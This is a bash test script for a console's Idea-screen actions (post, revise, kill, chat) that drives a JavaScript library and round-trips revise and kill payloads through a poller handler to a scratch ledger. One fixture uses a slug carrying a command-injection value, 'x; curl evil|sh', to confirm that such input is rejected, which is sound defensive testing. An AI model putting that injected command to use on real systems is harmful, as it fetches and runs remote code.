#!/bin/bash
# tests/idea-actions.bh-2520-test.sh — POST / REVISE / KILL / CHAT on the
# Mission Control Idea screen (BH-2520), and a revise that round-trips to the
# ledger.
#
# The screen's clicks are proved by node --test in
# console-ui/tests/idea-actions.bh-2520.test.js. What this file adds:
#   1. lib/idea-actions.js, DRIVEN: the status matrix, the payload shapes, and
#      that every type it emits is a case label bin/poll-commands.sh handles.
#   2. REVISE round trip: the payload the lib builds goes through the
#      proposal_gate handler extracted VERBATIM from bin/poll-commands.sh, which
#      runs the REAL bin/product-cmd.sh against a scratch ledger. The row comes
#      back at rev 2, gate_pending, carrying the notes, and a beat says so.
#   3. KILL round trip on the same rig: vetoed, with the notes, and a beat.
#   4. negatives: blank revise notes are refused before a payload exists, and
#      no payload carries an actor.
#   5. the node suite, run for real when the console-ui dependencies are
#      installed.
# Run from anywhere: tests/idea-actions.bh-2520-test.sh   (exit 0 = all pass)
set -uo pipefail
. "$(dirname "$0")/lib/scratch.sh" || exit 1
DIR=$(cd "$(dirname "$0")/.." && pwd)
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); }
bad() { FAIL=$((FAIL+1)); echo "FAIL: $1"; }

LIB="$DIR/console-ui/src/lib/idea-actions.js"
UI="$DIR/console-ui/src/ui/IdeaActions.js"
SCREEN="$DIR/console-ui/src/screens/Idea.js"
POLLER="$DIR/bin/poll-commands.sh"

for f in "$LIB" "$UI" "$SCREEN" "$POLLER"; do
  [ -f "$f" ] && ok || bad "missing $f"
done

command -v node >/dev/null 2>&1 || { echo "idea-actions: SKIPPED — node is not installed on this box"; exit 0; }
command -v jq >/dev/null 2>&1 || { echo "idea-actions: SKIPPED — jq is not installed on this box"; exit 0; }

# --- 1: the lib, driven -------------------------------------------------------
# The poller's case labels, read from the source: the lib must only emit types
# the poller already handles (the ticket: "they are already console action types").
LABELS=$(grep -E '^    (chat_proposal|post_proposal\|kill_proposal\|revise_proposal)\)' "$POLLER" \
  | sed -e 's/^ *//' -e 's/)$//' | tr '|' '\n' | sort | tr '\n' ' ')
[ "$LABELS" = "chat_proposal kill_proposal post_proposal revise_proposal " ] \
  && ok || bad "could not read the poller's four proposal case labels (got: '$LABELS')"

OUT=$(node --input-type=module -e "
import { availableIdeaActions, commandFor, textError } from '$LIB';
const eq = (name, got, want) =>
  console.log((JSON.stringify(got) === JSON.stringify(want) ? 'ok ' : 'no ') + name + ' got=' + JSON.stringify(got));
const row = (status) => ({ project: 'project-1', slug: 'weekly-digest', status });
eq('gate',      availableIdeaActions(row('gate_pending')), ['post', 'revise', 'kill', 'chat']);
eq('candidate', availableIdeaActions(row('candidate')), ['revise', 'kill', 'chat']);
eq('vetoed',    availableIdeaActions(row('vetoed')), ['revise', 'chat']);
eq('posted',    availableIdeaActions(row('posted')), ['chat']);
eq('null',      availableIdeaActions(null), []);
eq('bad-slug',  availableIdeaActions({ slug: 'x; curl evil|sh', status: 'gate_pending' }), []);
const types = ['post', 'kill', 'revise', 'chat'].map((a) => commandFor(a, 'p', 's', 'n').type).sort().join(' ') + ' ';
eq('types', types, '$LABELS');
eq('no-actor', ['post', 'kill', 'revise', 'chat'].some((a) => 'actor' in commandFor(a, 'p', 's', 'n')), false);
eq('blank-revise-refused', textError('revise', '   ') !== null, true);
eq('blank-chat-refused',   textError('chat', '') !== null, true);
eq('blank-kill-ok',        textError('kill', ''), null);
" 2>&1)
while IFS= read -r line; do
  case "$line" in
    ok\ *) ok ;;
    no\ *) bad "lib: ${line#no }" ;;
    *) [ -n "$line" ] && bad "lib: unexpected output: $line" ;;
  esac
done <<< "$OUT"

# --- 2/3: the round trip through the real poller handler and product-cmd.sh ---
mkdir -p "$T/bin/lib" "$T/logs" "$T/state" "$T/env" "$T/prompts"
cp "$DIR/bin/product-cmd.sh" "$DIR/bin/box-for.sh" "$DIR/bin/fleet-conf.sh" "$T/bin/"
# BH-2657: the local proposal_gate branch runs product-cmd.sh through bcx_run,
# which bin/poll-commands.sh sources at its top; the lifted block needs it too.
cp "$DIR/bin/lib/box-cmd-exec.sh" "$T/bin/lib/"
# project-1 is the hub's own project: box-for.sh answers `local`, so the
# handler runs product-cmd.sh synchronously and the ledger is written before it
# returns.
printf 'project-1 Org/project-1 https://m.example /api/board 0 local\n' > "$T/fleet.conf"
export FLEET_CONF="$T/fleet.conf"
cat > "$T/bin/agent-call.sh" <<EOF
#!/bin/bash
printf '%s\n' "\$@" > "$T/agent-call.argv"
exit 0
EOF
printf 'lane_model() { echo test-model; }\n' > "$T/bin/lib/lane-model.sh"
printf '#!/bin/bash\nexit 0\n' > "$T/bin/mockup-shot.sh"
printf '#!/bin/bash\nexit 0\n' > "$T/bin/push-proposal-assets.sh"
printf '#!/bin/bash\nprintf "%%s\\n" "$1" >> %s/beats\n' "$T" > "$T/bin/beat.sh"
chmod +x "$T/bin/"*.sh

extract() {
  awk -v n="$1" '
    $0 ~ "^    # >>> " n " handler" {f=1; next}
    $0 ~ "^    # <<< " n " handler" {exit}
    f {print}' "$POLLER" \
    | sed -e "1s/^    ${2})//" -e '$s/ ;;$//'
}
extract proposal_gate 'post_proposal|kill_proposal|revise_proposal' > "$T/pg.body"
[ -s "$T/pg.body" ] || { echo "FAIL: could not extract the proposal_gate handler — markers missing?"; exit 1; }

seed() { # a ledger row in the shape bin/run-product.sh writes for a drafted proposal
  rm -rf "$T/idea"; mkdir -p "$T/idea"
  printf '# Weekly digest\nOne email a week.\n' > "$T/idea/prd.md"
  printf '{"slug":"weekly-digest","title":"Weekly digest"}\n' > "$T/idea/idea.json"
  jq -nc --arg d "$T/idea" '[{slug:"weekly-digest",title:"Weekly digest",status:"gate_pending",rev:1,
    impact:4,effort:2,confidence:0.8,score:16,dir:$d,updated_at:"2026-09-25T10:00:00Z"}]' \
    > "$T/state/product-project-1.ledger.json"
  : > "$T/beats"; rm -f "$T/agent-call.argv"
}
# payload <action> <text>: what the Idea screen's click sends, built by the lib.
payload() {
  node --input-type=module -e "
import { commandFor } from '$LIB';
process.stdout.write(JSON.stringify(commandFor(process.argv[1], 'project-1', 'weekly-digest', process.argv[2])));
" "$1" "$2"
}
run_gate() { # run_gate <payload-json>
  HARNESS="$T" ID="c1" PROJECT="$(jq -r .project <<<"$1")" TYPE="$(jq -r .type <<<"$1")" PAYLOAD="$1" OK=false RESULT="" \
    bash -c 'set -uo pipefail; . "$HARNESS/bin/lib/box-cmd-exec.sh"; . "$0"; echo "OK=$OK RESULT=$RESULT"' "$T/pg.body"
}
LEDGER="$T/state/product-project-1.ledger.json"
row() { jq -c '.[] | select(.slug == "weekly-digest")' "$LEDGER"; }

# 2. REVISE
seed
P=$(payload revise '  make it weekly  ')
[ "$(jq -r .type <<<"$P")" = revise_proposal ] && ok || bad "revise payload type (got: $P)"
GOT=$(run_gate "$P")
grep -q '^OK=true' <<<"$GOT" && ok || bad "revise: the poller handler did not succeed: $GOT"
R=$(row)
[ "$(jq -r .rev <<<"$R")" = 2 ] && ok || bad "revise: ledger rev should be 2 (row: $R)"
[ "$(jq -r .status <<<"$R")" = gate_pending ] && ok || bad "revise: ledger status should be gate_pending (row: $R)"
[ "$(jq -r .notes <<<"$R")" = "make it weekly" ] && ok || bad "revise: ledger notes should be 'make it weekly' (row: $R)"
grep -q 'make it weekly' "$T/agent-call.argv" 2>/dev/null \
  && ok || bad "revise: the drafting pass never saw the notes"
jq -e 'select(.kind == "proposal" and .slug == "weekly-digest" and .rev == 2 and .status == "gate_pending")' "$T/beats" >/dev/null 2>&1 \
  && ok || bad "revise: no rev-2 gate_pending proposal beat (beats: $(cat "$T/beats"))"

# 3. KILL
seed
P=$(payload kill 'duplicate of the digest idea')
GOT=$(run_gate "$P")
grep -q '^OK=true' <<<"$GOT" && ok || bad "kill: the poller handler did not succeed: $GOT"
R=$(row)
[ "$(jq -r .status <<<"$R")" = vetoed ] && ok || bad "kill: ledger status should be vetoed (row: $R)"
[ "$(jq -r .notes <<<"$R")" = "duplicate of the digest idea" ] && ok || bad "kill: ledger notes missing (row: $R)"
jq -e 'select(.kind == "proposal" and .slug == "weekly-digest" and .status == "vetoed" and .notes == "duplicate of the digest idea")' "$T/beats" >/dev/null 2>&1 \
  && ok || bad "kill: no vetoed proposal beat (beats: $(cat "$T/beats"))"
[ -f "$T/agent-call.argv" ] && bad "kill must not buy an LLM session" || ok

# --- 4: negatives -------------------------------------------------------------
# The UI never builds a blank revise: textError blocks it (section 1, and the
# node suite holds CONFIRM disabled). Belt and braces: the lib's own check.
NEG=$(node --input-type=module -e "
import { textError, commandFor } from '$LIB';
console.log(textError('revise', '') === null ? 'no blank-revise' : 'ok blank-revise');
console.log('actor' in commandFor('revise', 'p', 's', 'x') ? 'no actor' : 'ok actor');
" 2>&1)
while IFS= read -r line; do
  case "$line" in ok\ *) ok ;; *) bad "negatives: $line" ;; esac
done <<< "$NEG"

# --- 5: the node suite, driven -----------------------------------------------
if [ ! -d "$DIR/console-ui/node_modules/preact-render-to-string" ]; then
  echo "idea-actions: node suite SKIPPED — console-ui dependencies are not installed (the console-ui CI job runs it)"
else
  if NOUT=$(cd "$DIR/console-ui" && node --test tests/idea-actions.bh-2520.test.js 2>&1); then ok
  else bad "console-ui idea-actions node suite failed:"; printf '%s\n' "$NOUT" | grep -E '^not ok|Error' | head -20
  fi
fi

echo "idea-actions: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
